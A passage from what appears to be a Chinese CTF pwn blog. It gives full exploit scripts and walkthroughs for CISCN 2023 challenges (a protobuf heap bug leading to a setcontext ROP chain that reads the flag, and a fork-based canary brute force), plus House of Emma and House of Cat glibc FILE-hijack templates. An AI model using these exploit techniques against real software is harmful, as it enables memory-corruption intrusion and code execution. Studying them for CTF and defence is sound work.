不过没有选择tcachebin attack\n貌似edit的时候会破坏原本的堆结构 在tcachebin attack的时候一直没法double free 最后放到fastbin里打任意写了\n因为开了沙盒 所以最后是用setcontext的办法来构造orw\n但是chunk的大小不够放 所以最后是把把orw改成了单次read 动调查看了执行完read的rsp指针 往那个地址读入rop链就行了\nfrom pwn import*from ctf_pb2 import *from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.57.248.214&quot;,16952)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(index,size,content):    global io    io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;)    chunk = pwn()    chunk.actionid = 2    chunk.msgidx = index*2    chunk.msgsize = size+0x10    chunk.msgcontent = content    io.send(chunk.SerializeToString())def edit(index,size,content):    global io    io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;)    chunk = pwn()    chunk.actionid = 4    chunk.msgidx = index*2    chunk.msgsize = size+0x10    chunk.msgcontent = content    io.send(chunk.SerializeToString())def show(index):    global io    io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;)    chunk = pwn()    chunk.actionid = 6    chunk.msgidx = index*2    chunk.msgsize = 0    chunk.msgcontent = b&#x27;&#x27;    io.send(chunk.SerializeToString())def delete(index):    global io    io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;)    chunk = pwn()    chunk.actionid = 8    chunk.msgidx = index*2    chunk.msgsize = 32    chunk.msgcontent = b&#x27;/bin/sh\\x00&#x27;    io.send(chunk.SerializeToString())for i in range(8):    add(i,0x100,b&#x27;/bin/sh\\x00&#x27;)for i in range(7):    delete(i+1)delete(0)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1ecbe0success(&quot;libc_addr :&quot;+hex(libc_addr))for i in range(8,17):    add(i,0x60,b&#x27;/bin/sh\\x00&#x27;)for i in range(10,17):    delete(i)delete(8)delete(9)delete(8)for i in range(17,24):    add(i,0x60,b&#x27;&#x27;)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]show(14)io.recv()heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x11c0success(&quot;heap_addr :&quot;+hex(heap_addr))gadget_addr = libc_addr + 0x0000000000151990add(24,0x60,p64(free_hook))add(25,0x60,p64(free_hook))add(26,0x60,p64(free_hook))add(27,0x60,p64(gadget_addr))chunk_addr = heap_addr  + 0x1db0-0xc0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))open_addr = libc_addr + libc.sym[&#x27;open&#x27;]rdx_addr = libc_addr + 0x0000000000119211rsp_addr = libc_addr + next(libc.search(asm(&quot;pop rsp;ret&quot;)))read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]ret_addr = libc_addr + 0x0000000000022679flag_addr = chunk_addr+0x10payload = b&#x27;./flag\\x00\\x00&#x27;+p64(chunk_addr+0x10)+cyclic(0x10)+p64(setcontext_addr)payload = payload.ljust(0xa0,b&#x27;\\x00&#x27;) + p64(chunk_addr+0x10+0xa8)+p64(ret_addr)payload += p64(rdi_addr)+p64(0)+p64(rsi_addr)+p64(heap_addr+0x1df0)+p64(rdx_addr)+p64(0x200)+p64(0)+p64(read_addr)#+p64(rsp_addr)+p64(heap_addr+0x1000)add(28,0x1d0,payload)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# pause(0)delete(28)# pause()payload = p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr+0x100) + p64(rdx_addr) + p64(0x50) + p64(0) + p64(write_addr)io.send(payload)flag = io.recvuntil(&quot;&#125;&quot;)print(flag)\n\nfuncanaryfork函数爆破canary 网上有相似的题目 直接用了爆破脚本 小改了一下 最后开了pie 还要再爆破16次 但是不知道为啥是概率通 很迷惑 多爆了了几次才出\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.105.26.155&quot;,38646)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7):    for i in range(0x100):        io.send(cyclic(0x68) + canary +  i.to_bytes(1,&#x27;little&#x27;))        a = io.recvuntil(&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += i.to_bytes(1,&#x27;little&#x27;)            breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive()\n\n","categories":["wp"]},{"title":"fork爆破canary","url":"/2023/05/28/fork%E7%88%86%E7%A0%B4canary/","content":"前言一种强行泄露出canary的办法 不是很喜欢这类题目 主要是爆破canary的时间比较久 如果后面的脚本有问题 就得重新跑 比较烦人\n原理原理主要来关注一下fork函数\nfork函数利用系统调用创建了一个子进程 这个子进程的终止与否都不会影响到父进程 系统会给子进程分配代码空间和存储数据 大部分和父进程是一样的\n关键的canary也和父进程是一样的 由于子进程的终止不会影响到父进程 所以 如果子进程由于canary不对而触发__stack_chk_fali函数\n子进程自己是终止了 但是父进程依然存在 所以可以利用这一点逐个字节爆破canary 如果最后不报错 就说明canary爆破成功 就可以进行栈溢出了\n实例Ciscn2023 funcanary\n保护机制全开 64位\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  __pid_t v3; // [rsp+Ch] [rbp-4h]  sub_1243(a1, a2, a3);  while ( 1 )  &#123;    v3 = fork();    if ( v3 &lt; 0 )      break;    if ( v3 )    &#123;      wait(0LL);    &#125;    else    &#123;      puts(&quot;welcome&quot;);      sub_128A();      puts(&quot;have fun&quot;);    &#125;  &#125;  puts(&quot;fork error&quot;);  exit(0);&#125;\n\nwhile嵌套了主要的逻辑 每次都fork出一个子进程 随后进入sub_128A执行操作 跟进一下\nunsigned __int64 sub_128A()&#123;  char buf[104]; // [rsp+0h] [rbp-70h] BYREF  unsigned __int64 v2; // [rsp+68h] [rbp-8h]  v2 = __readfsqword(0x28u);  read(0, buf, 0x80uLL);  return v2 - __readfsqword(0x28u);&#125;\n\n拥有栈溢出的机会 同时还有一个后门函数\nint sub_1228()&#123;  return system(&quot;/bin/cat flag&quot;);&#125;\n\n那么就是利用fork函数爆破出canary 随后就是栈溢出劫持程序执行流 但是由于开启了pie 所以还得再爆破一位 才能进入后门函数\n完整exp:\nfrom pwn import*from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;39.105.26.155&quot;,38646)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;welcome&quot;)canary = b&#x27;\\x00&#x27;for j in range(7):    for i in range(0x100):        io.send(cyclic(0x68) + canary +  i.to_bytes(1,&#x27;little&#x27;))        a = io.recvuntil(&#x27;welcome\\n&#x27;)        if b&#x27;have fun&#x27; in a:            canary += i.to_bytes(1,&#x27;little&#x27;)            breakpayload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x02&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x12&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x22&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x32&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x42&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x52&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x62&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x72&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x82&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\x92&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xa2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xb2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xc2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xd2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xe2&#x27;io.send(payload)payload = cyclic(0x68)+canary+cyclic(0x8)+b&#x27;\\x28\\xf2&#x27;io.send(payload)io.interactive()\n\n","categories":["栈"]},{"title":"Protobuf协议","url":"/2023/05/31/Protobuf%E5%8D%8F%E8%AE%AE/","content":"前言一种数据传输协议 2023年的国赛初赛考了一题基于这个堆题 需要使用其才能完成菜单交互 其中几个用来pack和unpack的函数代码审计起来很恶心 如果不知道这个协议的 看到以后会无从下手 挺恶心人的 刚好我有出题的需要 就记录一下相关的\n环境配置首先需要安装protoc 便于以后我们利用protoc文件生成py文件\nsudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-clientsudo apt-get install autoconf automake libtoolsudo apt-get install autoconf automake libtool curl make g++ unzip\n\ngit clone https://gitclone.com/github.com/protocolbuffers/protobuf.git cd protobuf./autogen.sh./configuremakesudo make installsudo ldconfig\n\n\n如果有出题需求的话 还需要安装protobuf-c 才能编译\ngit clone https://gitclone.com/github.com/protobuf-c/protobuf-c.gitcd protobuf-c/./autogen.sh &amp;&amp; ./configure &amp;&amp; make &amp;&amp; make install\n\n编译先从利用proto文件生成c语言编译所需要的pb-c.h文件说起\n诸如这样写好一个proto文件后\nsyntax = &quot;proto2&quot;;package test;message Student &#123;    optional string name = 1; //这个1无特殊含义 是表示顺序 如果还需要新增一个变量就=2&#125;optional和request是代表是否强制要求该数据 数据类型这个参照其他教程 我复制粘贴供哪天我本地查询\n\n\nprotoc-c --c_out=./ ./pwn.proto\n\n使用上面的指令会生成两个文件\n\n一个是在gcc编译时需要使用 一个是在源码编写中需要作为头文件导入\n同时需要注意 proto文件中变量名不区分大小写\n这个时候差不多就可以编写c语言源码了 直接上一个demo\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include &quot;pwn.pb-c.h&quot;size_t my_pack(char *out)&#123;    Test__Student a;    test__student__init(&amp;a);    a.name = &quot;hello&quot;;    return test__student__pack(&amp;a,out);&#125;void my_unpack(size_t len,const uint8_t *data)&#123;    Test__Student *tmp = test__student__unpack(NULL,len,data);    test__student__free_unpacked(tmp, NULL);&#125;int main()&#123;    char buf[0x20];    unsigned int len = my_pack(buf);    Test__Student *tmp = test__student__unpack(NULL,len,buf);    printf(&quot;%s\\n&quot;,tmp-&gt;name);&#125;\n\n一个完整的流程是 初始化包 将其值打包 最后解包得到参数 最后还可以销毁包\n这里的buf不一定要栈上 也可以malloc一块空间 总体应该还是很好理解的 这个时候我们就可以尝试编译了\n还需要带上刚才生成的pb-c文件\ngcc pwn.pb-c.c test.c -o pwn -lprotobuf-c\n\n此时 直接运行会出现如下的报错\n\nsudo ldconfig\n\n该指令可以搜寻共享动态库 创建出动态装入程序所需的连接和缓存文件\n\n可以看到成功输出hello 剩下的就没什么好说了 如果要想恶心一点就删符号表 静态编译 代码审计量巨大\n解题拿今年CISCN初赛的一题来举例 我也是通过这题了解到protobuf 抛开交互这道题是一个堆 我估计他的源码是用malloc开空间 所以在后面堆的时候 堆结构会改变 就很烦 这里就不提了 可以去看我的wp\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  ssize_t v3; // rsi  __int64 *v4; // [rsp+8h] [rbp-8h]  sub_1763(a1, a2, a3);  while ( 1 )  &#123;    memset(&amp;unk_A060, 0, 0x400uLL);    puts(&quot;You can try to have friendly communication with me now: &quot;);    v3 = read(0, &amp;unk_A060, 0x400uLL);    v4 = sub_192D(0LL, v3, &amp;unk_A060);    if ( !v4 )      ((&amp;sub_1328 + 1))(0LL, v3);    sub_155D(v4[3], v4[4], v4[5], v4[6], v4[7]);  &#125;&#125;\n\n菜单交互题  需要我们利用protobuf来传输数据\n第一步就是想办法复原出proto文件 f12查看一下字符串 看看是否有可疑的\n\n看变量名大概可以猜出来  actionid 代表了要操作的函数索引 msgidx是chunk索引 msgsize是malloc的大小 content则是内容\n至于Devicemsg则是包名  刚才也说了 不区分大小写的 唯一要注意的是 proto的编写也可以不要包名 但是这个我就没研究过了 感兴趣的自己看吧\nsyntax = &quot;proto2&quot;;package Devicemsg;message pwn &#123;    optional int64 actionid = 1;    optional int64 msgidx = 2;    optional int64 msgsize = 3;    optional bytes msgcontent = 4;&#125; \n\nprotoc --python_out=./ ./pwn.proto\n\n编写好proto文件后 生成py文件\nimport导入exp 最后按照如下编写即可\nfrom pwn import*from ctf_pb2 import *from ctypes import *#io = process(&quot;./pwn&quot;)io = remote(&quot;123.57.248.214&quot;,16952)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]libc = ELF(&quot;./libc-2.31.so&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug():    gdb.attach(io)    pause()def add(index,size,content):    global io    io.recvuntil(&quot;You can try to have friendly communication with me now: &quot;)    chunk = pwn()    chunk.actionid = 2    chunk.msgidx = index*2    chunk.msgsize = size+0x10    chunk.msgcontent = content    io.send(chunk.SerializeToString())\n\npwn()是根据你proto中的message名称\n","categories":["扩展"]},{"title":"House of Emma","url":"/2023/06/06/House-of-Emma/","content":"前言一种利用难度低 但是效果很强大的house of链 只需要两次largebinattack就可以做到控制程序执行流\n链路分析触发方式是基于house of kiwi 通过top chunk的size不足以供分配时 申请一个大size 而此时top chunk的size经过不正常覆盖 导致的检测失败 触发报错 引起的stderr结构体任意函数调用\n断点打在所有的伪造已经结束后 我们触发报错 准备利用fake_file  跟进到malloc函数中的int_malloc\n\n随后跟进到sysmalloc函数\n\n触发malloc_assert函数\n\n到这里和house of kiwi都还是利用的同一条链 接下来的会有所差别 house of kiwi考的是劫持IO_list_all来实现的fake_file 随后劫持vtable结构体 而此次链是利用stderr标准报错的输出来利用\n\n我们首先需要跟进一下__fxprintf函数\n\n从这两条汇编可以看出 确实是和stderr有关 这里其存储的值已经被我利用largebinattack修改为了堆地址\n接下来 来看一下是如何一步步获取控制执行流的能力以及要绕过哪些判断\n\n这里是第一个需要注意的点  此时rdi的值由rbx+0x88索引得到 而这个地址也是位于堆地址上的 这个值在随后的cmp指令中 嵌套了一个qword ptr 这意味着其值需为一个地址 才能继续执行下去 这里我选择的是堆基址 也就是rdi如图所示的值\n\n随后跟进到locked_vfxprintf函数中继续利用 随后继续跟进函数\n\n接着你会发现 在这个函数中 存在一个致命的任意函数调用\n\n这张图中最重要的就是rax寄存器 这个值如何控制 可以看到call执行的地址和rax寄存器是相关的 控制了rax也就可以控制程序执行流\n我们回溯一下汇编代码 定位到可供我们控制rax值的语句\n\n我们定位了到了这一句 可以看出此时r12寄存器的值是我们覆盖stderr的堆地址 也就是说在对应0xd8偏移处 填入我们想要其call的目标 就可以劫持程序执行流 实际上也就是覆盖了vtable结构体\n那么接下来的手法就是很普遍的2.29以后万能gadget+setcontext的办法来控制程序执行流 这里我懒得写orw了  只写了个system链 完整的伪造随后分析吧 接下来来看一下相关的注意事项\n注意事项首先我们要明白本次利用是如何获取执行流控制的机会的  对于vtable的具体位置的检测是比较宽松的 也就是说我们可以轻微的更改原本的偏移 使得我们调用到原本vtable表中的任意函数\nstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;  JUMP_INIT_DUMMY,  JUMP_INIT(finish, _IO_file_finish),  JUMP_INIT(overflow, _IO_file_overflow),  JUMP_INIT(underflow, _IO_file_underflow),  JUMP_INIT(uflow, _IO_default_uflow),  JUMP_INIT(pbackfail, _IO_default_pbackfail),  JUMP_INIT(xsputn, _IO_file_xsputn),  JUMP_INIT(xsgetn, _IO_default_xsgetn),  JUMP_INIT(seekoff, _IO_cookie_seekoff),  JUMP_INIT(seekpos, _IO_default_seekpos),  JUMP_INIT(setbuf, _IO_file_setbuf),  JUMP_INIT(sync, _IO_file_sync),  JUMP_INIT(doallocate, _IO_file_doallocate),  JUMP_INIT(read, _IO_cookie_read),  JUMP_INIT(write, _IO_cookie_write),  JUMP_INIT(seek, _IO_cookie_seek),  JUMP_INIT(close, _IO_cookie_close),  JUMP_INIT(stat, _IO_default_stat),  JUMP_INIT(showmanyc, _IO_default_showmanyc),  JUMP_INIT(imbue, _IO_default_imbue),&#125;;\n\n在这么多函数中 存在部分函数 其参数和调用指针均可被file结构体控制 所以就相当于一次任意指针调用 供我们控制程序执行流 以write举例\n_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)&#123;  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;  cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;#ifdef PTR_DEMANGLE  PTR_DEMANGLE (write_cb);#endif  if (write_cb == NULL)    &#123;      fp-&gt;_flags |= _IO_ERR_SEEN;      return 0;    &#125;  ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);  if (n &lt; size)    fp-&gt;_flags |= _IO_ERR_SEEN;  return n;&#125;\n\n可以看到调用write的指针和参数 都是由file结构体提供的 同时这里还要注意一下这个选项\n#ifdef PTR_DEMANGLE  PTR_DEMANGLE (write_cb);#endif\n\n其主要的作用就是起到加密指针 将原本的指针ror后 再和fs寄存器0x30偏移处的值进行异或\n由于对应的值我们没有办法泄露出来 所以可以通过两次largebinattack覆盖其为我们已知的值\n\n而两次largebinattack需要比较多的辅助chunk 我们肯定是想着能用到较少的chunk更好 所以就存在了第一次largebinattack完以后 我们需要重新回收chunk 将其从bin中重新申请出来 就需要恢复两个largebin chunk的四个域\n利用模板add(0x420)#0add(0x10)#1add(0x410)#2add(0x10)#3delete(0)add(0x500)#4delete(2)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x1ebfd0success(&quot;libc_addr :&quot;+hex(libc_addr))delete(1)delete(3)show(3)io.recv()heap_addr = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x6d0success(&quot;heap_addr :&quot;+hex(heap_addr))stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]payload = p64(0)*3 + p64(stderr_addr-0x20)edit(0,len(payload),payload)add(0x500)#5former_libc = libc_addr + 0x1ebfd0chunk0_addr = heap_addr +0x290chunk2_addr = heap_addr +0x6e0payload = p64(former_libc)+p64(chunk0_addr)*3edit(2,len(payload),payload)payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*2edit(0,len(payload),payload)add(0x420)#6add(0x410)#7delete(6)add(0x500)#8delete(7)TLS_addr = libc_addr+0x1f3580success(hex(TLS_addr))payload = p64(0)*3+p64(TLS_addr+0x30-0x20)edit(6,len(payload),payload)add(0x500)#9payload = p64(former_libc)+p64(chunk0_addr)*3#+cyclic(0x58)+p64(heap_addr)edit(2,len(payload),payload)payload = p64(chunk2_addr)+p64(former_libc)+p64(chunk2_addr)*2edit(0,len(payload),payload)payload = cyclic(0x508)+p64(0x100)edit(9,len(payload),payload)next_chain = 0srop_addr = heap_addr + 0x7c0gadget_addr = libc_addr + 0x00000000001547a0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]ret_addr = libc_addr + 0x0000000000025679fake_IO_FILE = 2 * p64(0)fake_IO_FILE += p64(0)  # _IO_write_base = 0fake_IO_FILE += p64(0)  # _IO_write_ptr = 0fake_IO_FILE += p64(0)fake_IO_FILE += p64(0)  # _IO_buf_basefake_IO_FILE += p64(0)  # _IO_buf_endfake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(next_chain)  # _chainfake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(heap_addr)  # _lock = writable addressfake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(0)  # _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\\x00&#x27;)fake_IO_FILE += p64(libc_addr + 0x1eca20 + 0x40)  # vtablefake_IO_FILE += p64(srop_addr)  # rdifake_IO_FILE += p64(srop_addr)fake_IO_FILE += p64(ROL(gadget_addr ^ (heap_addr + 0x6e0), 0x11))fake_IO_FILE += p64(0)+p64(setcontext_addr)fake_IO_FILE += cyclic(0x78)+p64(heap_addr+0x868)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)edit(2,len(fake_IO_FILE),fake_IO_FILE)# gdb.attach(io,&#x27;b *($rebase(0x1422))&#x27;)# pause(0)add(0x1000)# pause()io.interactive()\n\n部分地方根据自己复现的二进制文件不同修改 自己动调一遍其实就懂了\n","categories":["堆"]},{"title":"House of Cat","url":"/2023/06/07/House-of-Cat/","content":"前言2.34以上的版本取消了hook的存在 导致我们getshell的操作只能通过其他办法了 于是house of的链学习就成为了必要 house of cat这条链 只需要一次largebinattack的机会 随后就是伪造io结构 就可以做到劫持程序执行流 诸如setcontext等的利用\n链路分析触发io的方式和house of kiwi相似 都是通过assert输出报错 不过还是有所不同 接下来跟着我来分析一下\n截止到__main_assert函数的时候 链路都和house of kiwi一致 这里就不复述了\n\n不同的是 kiwi是利用fflush触发fake file 本次我们是通过fxprintf中的函数 来实现任意函数调用\n原理是因为vtable虽然在2.24以后加入了检测 但是由于检测不严格 对于一些轻微的偏移可以被无视 所以我们可以修改vtable为其他的表并且加上偏移 就可以实现表内的函数任意调用\n而在这些函数中 会存在一些以寄存器寻址的call指令 利用这一点我们就可以劫持程序执行流\n本次利用的关键就是_IO_wfile_seekoff函数 其内部会调用IO_switch_to_wget_mode函数 该函数内部存在一个可以被我们控制的call指令 \n我们首先利用largebinattack将stderr的地址覆盖为堆地址 随后在堆中伪造结构体 将vtable结构体修改为_IO_wfile_jumps+0x10  这样就可以顺利调用到_IO_wfile_seekoff函数 \n接着回到gdb 我们跟进一下fxprintf函数 一起完整的过一遍链\n\n我们还需要进行两次繁琐的函数跳转 随后才能到达利用的关键函数点\n\n\n这里 就会进入被我们所伪造的vtable表固定的偏移中 在我们上面那样设置的情况下 最后是会调用到_IO_wfile_seekoff函数 我们跟进一下\n可以看到 其内部存在IO_switch_to_wget_mode函数 我们跟进一下\n\n这里存在一个可控的call指令 rax的值可以被我们所操控 是写入到stderr上的堆地址固定偏移的一块地址\n\n如果我们在此处地方写入打setcontext用的万能gadget 再搭配上setcontext 就可以做到控制程序执行流\n链路其实是比较清晰的 我们主要是来看一下如何伪造 很多网上的资料其实伪造部分都没有讲清楚\n伪造分析\n首先我们提供一个完整的fake file构成 我们根据上面所圈出来的框 依次来讲解为什么要如此设定 需要绕过哪些地方 因为授人以鱼不如授人以渔  教会如何利用好动调来伪造结构体才是最重要的  虽然这篇文章也不能让你马上掌握这个能力\n首先是灰框部分 之所以要这样布局 我们先来看前面的这个libc地址 要明白其用意何在 我们首先要定义到需要这个参数的位置 我的办法是直接n 通常会直接卡在某个语句或者触发某个报错 通过这个办法来判断执行到了哪个汇编语句\n\n可以看到 是触发了进程的终止 那么这个一般是由于vtable表的检测失败引起的\n为了佐证我们的猜想 我们找到触发检测的函数 随后直接n 看能不能通过这个函数 结果发现不行 印证了猜想 那么我们要想绕过这一点 显然就是靠最近的一次判断 只要不跳转到执行vtable表检测的地方就行了\n\n\n关键的两个寄存器 就是rcx和rax了 rcx最后一次的复制和rax有关系 而rax当时的值是一个相对固定的\nrax最初的值是一个相对固定的 索引到的是一个libc地址\n\n而执行到sub的时候 对应的参数是一个栈上的地址\n\n显然sub后的rax值我们并没有办法改变 那么重点就是放在通过r12来影响rax的值\n注意到最开始r12的赋值语句 和rbp有关系 而rbp的值正是我们的fake file的起始地址 而对应的偏移正是我们所说的灰色部分 但是由于赋值完以后还要减去rdi寄存器的值 所以最后赋值给rax的值最好比较大一点\n接下来 我们根据程序执行流跟进到_IO_wfile_seekoff函数 可以看到要想成功执行到Io_switch_to_wget_mode函数 就需要我们通过上面的cmp判断 rcx和rdx这两个寄存器 分别溯源一下最后一次赋值\n\n\n和rax有关 而rax为fake file的起始地址 对应的偏移处是我们最开始图片的红框 我们要使得二者的值不一样 才能进入_IO_wfile_seekoff函数\n\n进入_IO_wfile_seekoff  可以看到此时我们就可以进行任意地址call了  对应的偏移是0xe0 对应着我们最开始图片的\n黄框 并且另外一个参数还有作用 这个后面遇到了再讲\n接着就是万能gadget的调用了\n\n此时rdi的值就是fake file的起始地址 我们需要给其设定对应的值 以此来决定rdx的值 从而控制最后的call\n对应着我们图片中的红框蓝框 我们将其布置好 使得接下来执行setcontext\n然后后面的就是setcontext的利用问题了 这里就不讲了\n没有提到的是紫色框中的参数 这一部分 我们直接将其赋为0  随后n看会卡在哪个地方\n\n可以看到会卡在这里 这里是因为rdi+8处不是一个地址 但是这里的cmp又要调用对应地址的内容 所以就无法进行 我们溯源一下 看看rdi的值是怎么得到的\n\n可以看到和rbx有关系 而动调发现rbx的值就是fake file的起始地址 所以在对应地址布置一下就好了\n模板首先泄露libc地址和hepa地址 随后利用largebinattaack在stderr写入可控堆块地址用来充当fake file\n随后布置好结构体 利用top chunk或者largebin chunk来触发io链 最后orw\nadd(0x420)#0add(0x10)#1add(0x410)#2add(0x10)#3delete(0)add(0x500)#4delete(2)show(0)libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x21a0b0success(&quot;libc_addr :&quot;+hex(libc_addr))delete(1)show(1)io.recv()heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;Heap_addr :&quot;+hex(heap_addr))stderr_addr = libc_addr + libc.sym[&#x27;stderr&#x27;]payload = p64(0)*3+p64(stderr_addr-0x20)edit(0,len(payload),payload)add(0x500)#5next_chain = 0gadget_addr = libc_addr + 0x0000000000165fa0setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))rdx_addr = libc_addr + 0x000000000005f65aret_addr = libc_addr + 0x0000000000028a87binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]gadget_addr = 0x0000000000165fa0+libc_addropen_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + 